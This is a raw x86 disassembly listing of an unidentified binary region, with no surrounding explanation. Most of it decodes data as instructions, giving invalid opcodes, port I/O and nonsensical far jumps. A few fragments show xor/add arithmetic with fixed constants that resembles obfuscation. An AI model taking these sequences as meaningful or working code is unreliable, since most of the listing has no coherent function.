  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	add    al,0xed
  407b35:	ins    BYTE PTR es:[edi],dx
  407b36:	inc    edx
  407b37:	pop    ecx
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b3a
  407b40:	out    dx,al
  407b41:	je     0x407bbc
  407b43:	dec    ebp
  407b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b45:	ficomp DWORD PTR [esi]
  407b47:	rcl    BYTE PTR [ebx+0x2],0x82
  407b4b:	outs   dx,BYTE PTR ds:[esi]
  407b4c:	fistp  WORD PTR [eax+0x22]
  407b4f:	fwait
  407b50:	dec    ebp
  407b51:	mov    cl,al
  407b53:	mov    ds:0x8916ca28,eax
  407b58:	push   ss
  407b59:	adc    BYTE PTR [eax],0xa
  407b5c:	inc    esp
  407b5d:	add    eax,0x3a04694b
  407b62:	stc    
  407b63:	js     0x407b8f
  407b65:	pop    ss
  407b66:	push   esi
  407b67:	jb     0x407b38
  407b69:	js     0x407b04
  407b6b:	or     esi,DWORD PTR [ebx-0x14]
  407b6e:	leave  
  407b6f:	add    cl,BYTE PTR [esi+ecx*2]
  407b72:	add    edi,eax
  407b74:	mov    cl,0xef
  407b76:	nop
  407b77:	std    
  407b78:	adc    BYTE PTR [eax-0x3a],dl
  407b7b:	xor    DWORD PTR [eax+0x2f],ebp
  407b7e:	stc    
  407b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b80:	pop    ds
  407b81:	call   0x35576911
  407b86:	iret   
  407b87:	jbe    0x407bef
  407b89:	into   
  407b8a:	pop    edi
  407b8b:	dec    ecx
  407b8c:	xor    al,0xdd
  407b8e:	shl    DWORD PTR [ecx+0xbff57e3],cl
  407b94:	fdivr  st(5),st
  407b96:	mov    bl,0x1e
  407b98:	jp     0x407ba3
  407b9a:	or     DWORD PTR [ecx-0x4b60e1fd],ecx
  407ba0:	xchg   ebx,eax
  407ba1:	fwait
  407ba2:	push   0x49
  407ba4:	pop    ss
  407ba5:	leave  
  407ba6:	sbb    DWORD PTR [ecx+0x64261dac],edi
  407bac:	hlt    
  407bad:	out    0x32,eax
  407baf:	push   esi
  407bb0:	lock aas 
  407bb2:	(bad)  
  407bb4:	push   0x8c4563e5
  407bb9:	cld    
  407bba:	xchg   DWORD PTR [esi+0x6abce2a4],ebx
  407bc0:	push   eax
  407bc1:	dec    eax
  407bc2:	push   0xffffffea
  407bc4:	clc    
  407bc5:	pop    esp
  407bc6:	add    esi,edi
  407bc8:	sub    al,0x95
  407bca:	je     0x407bbf
  407bcc:	inc    edi
  407bcd:	stc    
  407bce:	aas    
  407bcf:	addr16 cli 
  407bd1:	cwde   
  407bd2:	sub    bh,BYTE PTR [edi]
  407bd4:	push   ebp
  407bd5:	pop    esp
  407bd6:	sub    DWORD PTR [ebx],0x829e6be4
  407bdc:	daa    
  407bdd:	aam    0xf
  407bdf:	xchg   edx,eax
  407be0:	not    DWORD PTR [esi]
  407be2:	out    dx,eax
  407be3:	ss das 
  407be5:	adc    BYTE PTR [ebp+eiz*2-0x36],ah
  407be9:	aaa    
  407bea:	xor    esi,DWORD PTR [edi-0x6b]
  407bed:	adc    al,0x3e
  407bef:	push   edx
  407bf0:	iret   
  407bf1:	test   BYTE PTR [esp+eiz*2],dl
  407bf4:	xchg   edx,eax
  407bf5:	fs mov esi,0x8065c88f
  407bfb:	lods   eax,DWORD PTR ds:[esi]
  407bfc:	push   ecx
  407bfd:	xor    al,0x3d
  407bff:	mov    cl,bh
  407c01:	xchg   ebp,eax
  407c02:	mov    bh,0x1
  407c04:	mov    ah,0x3
  407c06:	xor    BYTE PTR [eax+ebx*1],0xcd
  407c0a:	add    edx,esp
  407c0c:	mov    dl,0x21
  407c0e:	push   edx
  407c0f:	xor    DWORD PTR [eax+eax*8-0xbb9a285],edx
  407c16:	mov    BYTE PTR [esi+ebx*1-0x53],0x54
  407c1b:	adc    dh,bh
  407c1d:	adc    DWORD PTR [esi+0x1590d643],ecx
  407c23:	aad    0xdf
  407c25:	inc    esp
  407c26:	and    al,0xd2
  407c28:	sbb    BYTE PTR [esi-0x11],al
  407c2b:	mov    BYTE PTR [eax],cl
  407c2d:	lahf   
  407c2e:	xor    eax,0xb7e39605
  407c33:	xchg   esi,eax
  407c34:	test   al,0x40
  407c36:	dec    edx
  407c37:	mov    al,0xf0
  407c39:	pop    esp
  407c3a:	inc    edi
  407c3b:	dec    ecx
  407c3c:	jb     0x407c21
  407c3e:	mov    ebp,0xe75201b6
  407c43:	mov    al,ds:0x6f6decd9
  407c48:	stos   DWORD PTR es:[edi],eax
  407c49:	cmp    al,0xb7
  407c4b:	push   edi
  407c4c:	clc    
  407c4d:	inc    esi
  407c4e:	lds    esi,FWORD PTR [eax-0x6e71a773]
  407c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c55:	retf   
  407c56:	or     al,BYTE PTR [edx]
  407c58:	(bad)  
  407c59:	mov    ebx,0x73622d1a
  407c5e:	cmp    DWORD PTR [ebp+0x26],eax
  407c61:	jbe    0x407ca0
  407c63:	(bad)  
  407c65:	stos   BYTE PTR es:[edi],al
  407c66:	popa   
  407c67:	out    dx,al
  407c68:	fld    DWORD PTR [ebx+0x1c]
  407c6b:	ja     0x407c48
  407c6d:	push   ds
  407c6e:	aam    0xe6
  407c70:	or     dh,BYTE PTR [ebp-0x56]
  407c73:	adc    al,0x88
  407c75:	mov    ebx,0x51278470
  407c7a:	xor    al,al
  407c7c:	jle    0x407c0a
  407c7e:	mov    ah,0xd0
  407c80:	cld    
  407c81:	xchg   BYTE PTR [esi-0x25],bh
  407c84:	pop    ebp
  407c85:	cdq    
  407c86:	sbb    DWORD PTR [eax],edi
  407c88:	jo     0x407c42
  407c8a:	jmp    0x78a6:0x1944780c
  407c91:	sub    BYTE PTR [eax],dl
  407c93:	rcl    DWORD PTR [eax+eax*2-0x3],1
  407c97:	sahf   
  407c98:	shr    DWORD PTR [ecx-0x5c6c74c1],1
  407c9e:	cmp    ecx,eax
  407ca0:	lea    edi,[ecx+ebx*8-0x27468f06]
  407ca7:	pop    es
  407ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ca9:	push   ecx
  407caa:	data16 (bad) 
  407cac:	adc    DWORD PTR [ebp+0x4252281a],esi
  407cb2:	jle    0x407c81
  407cb4:	xchg   edx,eax
  407cb5:	test   DWORD PTR [ebp+0x2260c10],esp
  407cbb:	(bad)  
  407cbc:	frstor [eax+0x23]
  407cbf:	pop    ebx
  407cc0:	pop    ss
  407cc1:	psrad  mm2,QWORD PTR [ebx+edi*1]
  407cc5:	into   
  407cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc7:	jno    0x407cd5
  407cc9:	mul    DWORD PTR [eax-0x15]
  407ccc:	mov    edi,0xe6339ae9
  407cd1:	outs   dx,BYTE PTR ds:[esi]
  407cd2:	mov    bh,0x82
  407cd4:	mov    edi,0x25e6ecf2
  407cd9:	popa   
  407cda:	outs   dx,BYTE PTR ds:[esi]
  407cdb:	xor    BYTE PTR [edx],cl
  407cdd:	dec    edi
  407cde:	pop    edx
  407cdf:	jle    0x407d0a
  407ce1:	hlt    
  407ce2:	bound  ebx,QWORD PTR [edx+edx*1]
  407ce5:	stos   DWORD PTR es:[edi],eax
  407ce6:	cmp    BYTE PTR [esi-0x57],ah
  407ce9:	out    0x81,eax
  407ceb:	add    ebx,DWORD PTR [edi+0x128c70f6]
  407cf1:	in     eax,0x54
  407cf3:	stos   BYTE PTR es:[edi],al
  407cf4:	pop    ds
  407cf5:	pop    edi
  407cf6:	jo     0x407d46
  407cf8:	cmp    al,0x3b
  407cfa:	test   DWORD PTR [ecx],esi
  407cfc:	or     ebx,esp
  407cfe:	or     dh,BYTE PTR [eax+ebp*8-0x59291517]
  407d05:	je     0x407ca3
  407d07:	cmp    dh,BYTE PTR [edi-0xe]
  407d0a:	lahf   
  407d0b:	inc    esi
  407d0c:	xchg   ebp,eax
  407d0d:	int    0xdc
  407d0f:	add    ebx,DWORD PTR [esi+eax*4-0x24]
  407d13:	xor    eax,0x63fe460
  407d18:	sub    BYTE PTR [eax-0x2b95020a],0xb0
  407d1f:	shl    BYTE PTR [eax-0xbca5e5c],cl
  407d25:	sbb    BYTE PTR ds:0x3cb41341,cl
  407d2b:	pop    esp
  407d2c:	xor    BYTE PTR [edi+0x940ce05],cl
  407d32:	lea    ebx,[edx-0x35a5f2c]
  407d38:	and    BYTE PTR [edi+0x1e],bh
  407d3b:	pop    esp
  407d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d3d:	sbb    edi,ecx
  407d3f:	into   
  407d40:	lock mov fs,ebp
  407d43:	aaa    
  407d44:	mov    DWORD PTR [eax],ecx
  407d46:	js     0x407ce0
  407d48:	pop    ebx
  407d49:	xchg   ecx,eax
  407d4a:	push   cs
  407d4b:	mov    eax,0x557befdb
  407d50:	icebp  
  407d51:	sub    eax,edx
  407d53:	rcl    BYTE PTR ds:0x58550912,1
  407d59:	out    0x42,eax
  407d5b:	aaa    
  407d5c:	imul   esi,DWORD PTR [edx-0x4ea928dc],0xcf97102
  407d66:	sbb    dl,dh
  407d68:	into   
  407d69:	dec    esi
  407d6a:	sbb    eax,0x5f52a258
  407d6f:	enter  0xfd91,0x3
  407d73:	ds mov edi,0x38061337
  407d79:	dec    edi
  407d7a:	dec    ecx
  407d7b:	inc    esp
  407d7c:	test   eax,0xc0f78fed
  407d81:	leave  
  407d82:	(bad)  
  407d84:	fnstsw WORD PTR [edi+0x7a85414]
  407d8a:	mov    eax,ds:0xcbe64568
  407d8f:	ins    DWORD PTR es:[edi],dx
  407d90:	dec    ecx
  407d91:	xor    eax,0x29a07042
  407d96:	int    0x63
  407d98:	mov    ah,0x4c
  407d9a:	enter  0xd327,0xaf
  407d9e:	enter  0x7f3f,0xfb
  407da2:	cs cmp al,0xf
  407da5:	mov    esp,es
  407da7:	dec    edi
  407da8:	adc    DWORD PTR [esp+eiz*2+0x4f5eabc3],esi
  407daf:	jne    0x407dfa
  407db1:	push   esp
  407db2:	clc    
  407db3:	mov    ds:0xb7113eb2,eax
  407db8:	pop    ebp
  407db9:	xchg   edi,eax
  407dba:	inc    eax
  407dbb:	daa    
  407dbc:	and    eax,0xdbeefb80
  407dc1:	jp     0x407d71
  407dc3:	mov    eax,0x955a047d
  407dc8:	adc    ch,0x7e
  407dcb:	test   DWORD PTR [ebp+edx*8+0x6d02c957],eax
  407dd2:	test   DWORD PTR [eax+0xe],ebp
  407dd5:	jno    0x407d98
  407dd7:	sbb    ebp,DWORD PTR [ecx]
  407dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dda:	xchg   esp,eax
  407ddb:	into   
  407ddc:	in     al,0xc0
  407dde:	inc    esi
  407ddf:	out    dx,al
  407de0:	xchg   ebp,eax
  407de1:	daa    
  407de2:	jns    0x407dd7
  407de4:	pop    ds
  407de5:	fdivr  QWORD PTR [ebx+0x67e2c44e]
  407deb:	adc    esi,eax
  407ded:	cmp    DWORD PTR [esi+0x7b],edi
  407df0:	pusha  
  407df1:	std    
  407df2:	es (bad) 
  407df4:	mov    ecx,0xc705c634
  407df9:	cld    
  407dfa:	push   esi
  407dfb:	push   esi
  407dfc:	je     0x407deb
  407dfe:	add    BYTE PTR [edi-0x40aa1f6b],cl
  407e04:	scas   eax,DWORD PTR es:[edi]
  407e05:	fs fs pop esp
  407e08:	mov    bh,0x53
  407e0a:	mul    DWORD PTR [edi-0x5b]
  407e0d:	fsubp  st(2),st
  407e0f:	jg     0x407e5f
  407e11:	sub    ebp,DWORD PTR [esi+0x3f]
  407e14:	jbe    0x407e30
  407e16:	leave  
  407e17:	fst    DWORD PTR [ebx+0x2a49fe04]
  407e1d:	and    edi,eax
  407e1f:	fnstsw WORD PTR [ecx+0x4ec0bd26]
  407e25:	sbb    al,0x26
  407e27:	pop    esi
  407e28:	inc    eax
  407e29:	adc    bl,BYTE PTR [eax+edi*4+0xf80d4d3]
  407e30:	imul   esi,esi,0x6c
  407e33:	popa   
  407e34:	int3   
  407e35:	push   ebp
  407e36:	push   cs
  407e37:	ins    DWORD PTR es:[edi],dx
  407e38:	and    ebx,DWORD PTR [eax+edx*2+0x8]
  407e3c:	and    DWORD PTR [ecx+0x2600beae],edx
  407e42:	push   ss
  407e43:	mov    cl,0x77
  407e45:	iret   
  407e46:	mov    ds:0xffdfb027,al
  407e4b:	fmul   st(4),st
  407e4d:	std    
  407e4e:	push   ss
  407e4f:	mov    esp,cs
  407e51:	pop    eax
  407e52:	cmp    BYTE PTR [ebp+0x23e9d],ch
  407e58:	addr16 call 0x37fa8821
  407e5e:	xchg   bl,ch
  407e60:	jp     0x407e27
  407e62:	pop    edx
  407e63:	mov    dl,0xed
  407e65:	js     0x407e1d
  407e67:	or     al,0x51
  407e69:	jns    0x407e1c
  407e6b:	dec    ebx
  407e6c:	stos   DWORD PTR es:[edi],eax
  407e6d:	scas   eax,DWORD PTR es:[edi]
  407e6e:	adc    DWORD PTR [eax+0x34db6792],edx
  407e74:	call   0x14047488
  407e79:	xlat   BYTE PTR ds:[ebx]
  407e7a:	loopne 0x407ec1
  407e7c:	popf   
  407e7d:	xchg   BYTE PTR [ecx-0x71],al
  407e80:	outs   dx,BYTE PTR ds:[esi]
  407e81:	push   0x1a112f1c
  407e86:	jae    0x407e34
  407e88:	push   ds
  407e89:	inc    ecx
  407e8a:	sbb    eax,0x7921917d
  407e8f:	add    BYTE PTR [eax],al
  407e91:	fiadd  WORD PTR [eax-0x2aa80127]
  407e97:	fwait
  407e98:	inc    edi
  407e99:	retf   
  407e9a:	push   edi
  407e9b:	lahf   
  407e9c:	push   ds
  407e9d:	std    
  407e9e:	adc    dh,dl
  407ea0:	push   0xb40d433e
  407ea5:	sbb    ebp,esp
  407ea7:	popf   
  407ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea9:	lods   eax,DWORD PTR ds:[esi]
  407eaa:	pop    ebx
  407eab:	ins    DWORD PTR es:[edi],dx
  407eac:	(bad)  
  407ead:	ds dec ebp
  407eaf:	rcr    DWORD PTR ds:0x637a03b5,cl
  407eb5:	xchg   BYTE PTR ds:0x36052a1b,cl
  407ebb:	add    BYTE PTR [ecx+ecx*1-0x36],ch
  407ebf:	(bad)  
  407ec0:	push   edx
  407ec1:	push   ebp
  407ec2:	call   0x2483f9d9
  407ec7:	add    ecx,eax
  407ec9:	and    ecx,esi
  407ecb:	cdq    
  407ecc:	out    dx,al
  407ecd:	mov    ds:0x467cd801,eax
  407ed2:	xchg   ecx,eax
  407ed3:	jnp    0x407e81
  407ed5:	cld    
  407ed6:	and    ebp,DWORD PTR [edx]
  407ed8:	scas   al,BYTE PTR es:[edi]
  407ed9:	sbb    eax,ebx
  407edb:	sahf   
  407edc:	(bad)  
  407edd:	je     0x407ebf
  407edf:	imul   ebp,DWORD PTR [edx-0x5d],0xb83d2d8
  407ee6:	mov    eax,ds:0xa32bb309
  407eeb:	mov    edi,0x9eda39b6
  407ef0:	ficom  WORD PTR [ecx+edx*2+0x26403b73]
  407ef7:	push   ecx
  407ef8:	js     0x407f45
  407efa:	mov    edx,0xcc024d57
  407eff:	(bad)  
  407f00:	sahf   
  407f01:	lahf   
  407f02:	add    eax,0x8b5fa0ef
  407f07:	test   ebx,ebp
  407f09:	scas   al,BYTE PTR es:[edi]
  407f0a:	xor    ax,0x1da1
  407f0e:	ficomp DWORD PTR [ebx]
  407f10:	cmp    ax,WORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407fdb
  407f78:	fs pop ecx
  407f7a:	mov    ebp,0x7e7ed2aa
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407f95
  407f84:	or     BYTE PTR [ebx+0x21149ec2],dl
  407f8a:	aad    0xc1
  407f8c:	aad    0xf1
  407f8e:	pop    es
  407f8f:	push   edx
  407f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f91:	(bad)
  407f96:	dec    ecx
  407f97:	iret   
  407f98:	push   edx
  407f99:	in     eax,0x43
  407f9b:	push   esi
  407f9c:	fdivr  DWORD PTR [ebx+0x10]
  407f9f:	xor    al,0x2f
  407fa1:	sub    al,0xea
  407fa3:	mov    ds:0x8a853c97,al
  407fa8:	int3   
  407fa9:	es mov di,cx
  407fad:	sub    DWORD PTR [ebx+0x77681b53],eax
  407fb3:	ret    0xc6cf
  407fb6:	cmp    eax,0x66c2f847
  407fbb:	cs or  al,0x5e
  407fbe:	push   ebp
  407fbf:	add    BYTE PTR [ebx-0x32],bl
  407fc2:	add    eax,eax
  407fc4:	inc    edx
  407fc5:	xchg   esi,eax
  407fc6:	into   
  407fc7:	add    bh,BYTE PTR [esp+edx*4]
  407fca:	lahf   
  407fcb:	jl     0x407f78
  407fcd:	push   esp
  407fce:	fs ret 0xf230
  407fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fd3:	ja     0x408008
  407fd5:	push   0x3c3cd642
  407fda:	cli    
  407fdb:	retf   
  407fdc:	mov    al,0xd5
  407fde:	loopne 0x407fe6
  407fe0:	adc    eax,0x532a701a
  407fe5:	and    ecx,edx
  407fe7:	fs ret 
  407fe9:	popa   
  407fea:	sbb    eax,0x841321b0
  407fef:	adc    eax,0x4d1f60fa
  407ff4:	cmp    al,0x6a
  407ff6:	mov    ch,0x9f
  407ff8:	(bad)  [ebp+0x34dd39b2]
  407ffe:	ins    BYTE PTR es:[edi],dx
  407fff:	dec    edx
  408000:	loopne 0x407f94
  408002:	lods   eax,DWORD PTR ds:[esi]
  408003:	cld    
  408004:	iret   
  408005:	lahf   
  408006:	outs   dx,BYTE PTR ds:[esi]
  408007:	and    edi,ecx
  408009:	jb     0x408084
  40800b:	retf   0xd13d
  40800e:	int3   
  40800f:	mov    ebp,0x8f8879e9
  408014:	push   edx
  408015:	push   ds
  408016:	cld    
  408017:	xlat   BYTE PTR ds:[ebx]
  408018:	cli    
  408019:	mov    eax,0xa6a60f53
  40801e:	jae    0x40805b
  408020:	int    0xd7
  408022:	pop    esp
  408024:	cmp    BYTE PTR [edi+eiz*4],al
  408027:	jo     0x407fe8
  408029:	(bad)  
  40802a:	ja     0x408038
  40802c:	fwait
  40802d:	lea    eax,[esi+edi*2-0x4a]
  408031:	fstp   TBYTE PTR [eax+0x3a]
  408034:	(bad)  
  408036:	dec    ebp
  408037:	lea    esi,[ecx+0xcde2c85]
  40803d:	pop    edx
  40803e:	jl     0x408084
  408040:	cmp    ecx,esp
  408042:	ins    DWORD PTR es:[edi],dx
  408043:	cmc    
  408044:	stos   DWORD PTR es:[edi],eax
  408045:	jge    0x40805d
  408047:	sbb    BYTE PTR [edx*2+0x3b890bc1],dh
  40804e:	inc    esp
  40804f:	fsubr  DWORD PTR [ebp+0x34]
  408052:	cwde   
  408053:	sbb    bl,BYTE PTR [edx+0x68a3cb5b]
  408059:	sbb    BYTE PTR [edx-0x3746a135],dl
  40805f:	or     eax,0x42ee8151
  408064:	loop   0x408092
  408066:	pusha  
  408067:	mov    ah,0x9f
  408069:	and    DWORD PTR [edi],0x67b60f43
  40806f:	repnz inc edi
  408071:	js     0x40807b
  408073:	fst    QWORD PTR [eax+0x12a74e25]
  408079:	fstp   QWORD PTR [edi+0xeda0fc5]
  40807f:	cmp    eax,0x49d661e
  408084:	and    al,0xc7
  408086:	xchg   BYTE PTR [edi+0x73a38aa3],dh
  40808c:	rol    BYTE PTR [ebx],1
  40808e:	mov    cl,0x4c
  408090:	jmp    0x4080ab
  408092:	stos   DWORD PTR es:[edi],eax
  408093:	fs mov dh,0x1b
  408096:	outs   dx,DWORD PTR ds:[esi]
  408097:	add    edx,edi
  408099:	mov    esi,0xef65efe9
  40809e:	push   ebx
  40809f:	ret    
  4080a0:	jb     0x408029
  4080a2:	(bad)  [edx-0x65d3dbd]
  4080a8:	test   eax,0x7fd9d4d6
  4080ad:	jg     0x4080e1
  4080af:	xchg   edi,eax
  4080b0:	pop    ds
  4080b1:	test   DWORD PTR [ecx+0xde23eab],esp
  4080b7:	in     eax,dx
  4080b8:	and    DWORD PTR [ebp-0x2b],ebx
  4080bb:	cmp    dh,ah
  4080bd:	cmp    eax,DWORD PTR [esi-0x4dfb4e68]
  4080c3:	cmp    edi,DWORD PTR [ebx]
  4080c5:	js     0x4080ab
  4080c7:	dec    edx
  4080c8:	shl    DWORD PTR [edx-0x33a4de77],0x7b
  4080cf:	ficom  WORD PTR [esi]
  4080d1:	mov    eax,0xdc2dff12
  4080d6:	and    eax,0x8103da59
  4080db:	repnz adc BYTE PTR [edi],0x3d
  4080df:	dec    ebx
  4080e0:	cmp    al,0xcd
  4080e2:	push   ss
  4080e3:	call   0x37d:0x3eac52ab
  4080ea:	enter  0x6e6f,0x32
  4080ee:	add    DWORD PTR [esi-0x2c61f9f5],0xffffffc5
  4080f5:	fcmovnbe st,st(7)
  4080f7:	fwait
  4080f8:	jmp    0x6ee9:0x98c569a7
  4080ff:	fs aam 0xf4
  408102:	sub    dl,BYTE PTR [ebx-0x4d]
  408105:	adc    edi,eax
  408107:	jns    0x408175
  408109:	dec    edx
  40810a:	fdivr  DWORD PTR [edx-0x75]
  40810d:	mov    bl,BYTE PTR [ebx-0x3c82ab1f]
  408113:	sbb    ebx,DWORD PTR [ecx-0x736d46db]
  408119:	cs pop ecx
  40811b:	dec    esp
  40811c:	xchg   ebx,eax
  40811d:	ins    DWORD PTR es:[edi],dx
  40811e:	fstp   DWORD PTR ds:0xfa60c786
  408124:	cmp    ecx,DWORD PTR [eax-0x4a88bea7]
  40812a:	add    al,0xb
  40812c:	adc    DWORD PTR [ebx],esp
  40812e:	adc    al,0x4c
  408130:	sbb    ebx,DWORD PTR [ebx+0x2d]
  408133:	scas   al,BYTE PTR es:[edi]
  408134:	dec    esi
  408135:	jb     0x4080f3
  408137:	dec    ebx
  408138:	fmulp  st(0),st
  40813a:	stc    
  40813b:	sbb    BYTE PTR [edx],dh
  40813d:	loop   0x40810e
  40813f:	push   0xffffff94
  408141:	jg     0x4080f9
  408143:	icebp  
  408144:	mov    gs,WORD PTR [ecx+0x40]
  408147:	cmp    al,0x12
  408149:	or     bl,dh
  40814b:	iret   
  40814c:	fstp   DWORD PTR [eax*2+0x536d269a]
  408153:	inc    esi
  408154:	cmc    
  408155:	push   es
  408156:	cs icebp 
  408158:	sar    BYTE PTR [eax],1
  40815a:	jo     0x40814c
  40815c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40815d:	test   DWORD PTR [eax-0x347dc5ef],ebx
  408163:	rol    BYTE PTR [ebp+0x5d2556e6],cl
  408169:	and    dh,BYTE PTR [ecx+0x5a8afcf3]
  40816f:	sbb    DWORD PTR [ecx],0x3668295e
  408175:	xchg   DWORD PTR [ecx],ecx
  408177:	in     eax,0xd3
  408179:	mov    edi,0xb0397385
  40817e:	scas   eax,DWORD PTR es:[edi]
  40817f:	out    0xe,al
  408181:	push   eax
  408182:	xlat   BYTE PTR ds:[ebx]
  408183:	scas   al,BYTE PTR es:[edi]
  408184:	(bad)  [esi+0x63]
  408187:	xchg   ebx,eax
  408188:	dec    eax
  408189:	xor    edi,DWORD PTR [ebx]
  40818b:	aas    
  40818c:	push   ecx
  40818d:	outs   dx,DWORD PTR ds:[esi]
  40818e:	inc    DWORD PTR [esi+ecx*8]
  408191:	sbb    edx,eax
  408193:	fnstsw WORD PTR [esi]
  408195:	adc    dl,BYTE PTR [edx+0x1807ed5a]
  40819b:	ret    
  40819c:	xchg   edi,eax
  40819d:	push   ds
  40819e:	adc    bh,dh
  4081a0:	jae    0x408133
  4081a2:	inc    ebx
  4081a3:	not    BYTE PTR [eax-0x7d]
  4081a6:	aad    0x9b
  4081a8:	aad    0x22
  4081aa:	and    eax,0x565ad2f3
  4081af:	fistp  WORD PTR [ebx-0x2f]
  4081b2:	sbb    ch,BYTE PTR [esi-0x50]
  4081b5:	mov    ecx,0x284e2d19
  4081ba:	and    DWORD PTR [ecx+0x6a],0x5f
  4081be:	pusha  
  4081bf:	mov    ch,BYTE PTR [ecx]
  4081c1:	sub    eax,0x98c6a7b6
  4081c6:	sti    
  4081c7:	ds dec ecx
  4081c9:	cs in  eax,dx
  4081cb:	daa    
  4081cc:	xor    DWORD PTR ds:[ebp-0x59],eax
  4081d0:	cdq    
  4081d1:	js     0x4081b7
  4081d3:	xchg   esi,eax
  4081d4:	ins    DWORD PTR es:[edi],dx
  4081d5:	in     eax,dx
  4081d6:	pop    edx
  4081d7:	test   al,0x93
  4081d9:	fdivr  QWORD PTR [edi+0x12ec378]
  4081df:	sub    edi,eax
  4081e1:	xchg   esi,eax
  4081e2:	push   0xffffffa5
  4081e4:	or     ebx,esp
  4081e6:	fdiv   st(6),st
  4081e8:	cdq    
  4081e9:	sbb    BYTE PTR [ebx],ah
  4081eb:	xor    eax,0xfe9b19a
  4081f0:	xor    al,0xa2
  4081f2:	call   0xb540:0x1f2ee690
  4081f9:	inc    ebp
  4081fa:	bsr    ebp,DWORD PTR [esi]
  4081fd:	adc    edi,DWORD PTR [ecx-0x5e8fbbde]
  408203:	int    0xd
  408205:	loope  0x408209
  408207:	neg    bl
  408209:	mov    ch,0x7c
  40820b:	ror    DWORD PTR [eax-0x3af32c76],1
  408211:	les    edx,FWORD PTR [ebx-0x4b]
  408214:	dec    esi
  408215:	mov    dl,0x20
  408217:	cdq    
  408218:	mov    ch,0xb7
  40821a:	fmul   QWORD PTR [eax+0x2]
  40821d:	dec    eax
  40821e:	xor    al,0xb5
  408220:	adc    BYTE PTR [ecx],ah
  408222:	lds    ecx,FWORD PTR [ebx+0x36]
  408225:	out    0x7c,al
  408227:	xor    edx,ebx
  408229:	call   0xf6b9e274
  40822e:	adc    al,0xd2
  408230:	xchg   esi,eax
  408231:	dec    edi
  408232:	sub    al,0xc9
  408234:	sbb    ah,dl
  408236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408237:	xchg   esi,eax
  408238:	repz sub edx,DWORD PTR [edx-0x146eb236]
  40823f:	mov    esi,0x925c57e6
  408244:	dec    esp
  408245:	jmp    0xd0e2:0x4f6f601e
  40824c:	cmp    DWORD PTR [ebx+0x4390ac46],esp
  408252:	outs   dx,BYTE PTR ds:[esi]
  408253:	out    0xd8,al
  408255:	outs   dx,BYTE PTR ds:[esi]
  408256:	add    DWORD PTR es:[ebx-0x33d881df],edx
  40825d:	inc    edi
  40825e:	xor    eax,0x5f76a734
  408263:	maxps  xmm3,XMMWORD PTR [ebx+esi*1+0x27ae9b1f]
  40826b:	adc    DWORD PTR [edx],edx
  40826d:	shl    dl,cl
  40826f:	ds dec edx
  408271:	rcl    ebp,0x93
  408274:	push   0x60
  408276:	test   eax,0x70f91591
  40827b:	aas    
  40827c:	push   ebx
  40827d:	xor    al,0xe0
  40827f:	jmp    0x4082d3
  408281:	cwde   
  408282:	in     al,dx
  408283:	mov    WORD PTR [ecx+0x73],es
  408286:	jmp    0xa3ce:0x94e415a4
  40828d:	imul   eax,edi,0xffffffbb
  408290:	iret   
  408291:	add    BYTE PTR [edi+0x1da40edc],dl
  408297:	mov    dh,0x38
  408299:	outs   dx,BYTE PTR ds:[esi]
  40829a:	and    BYTE PTR [edx-0x47a293cb],0x5f
  4082a1:	cwde   
  4082a2:	call   0x1ce9:0x53270604
  4082a9:	fild   WORD PTR [edi-0x6f]
  4082ac:	imul   edx,DWORD PTR [edx],0xd
  4082af:	mov    ecx,0xe82454d5
  4082b4:	jb     0x408298
  4082b6:	inc    edx
  4082b7:	cmp    eax,0xb9013201
  4082bc:	add    esi,ebx
  4082be:	cmp    edi,DWORD PTR [ecx+0x2d]
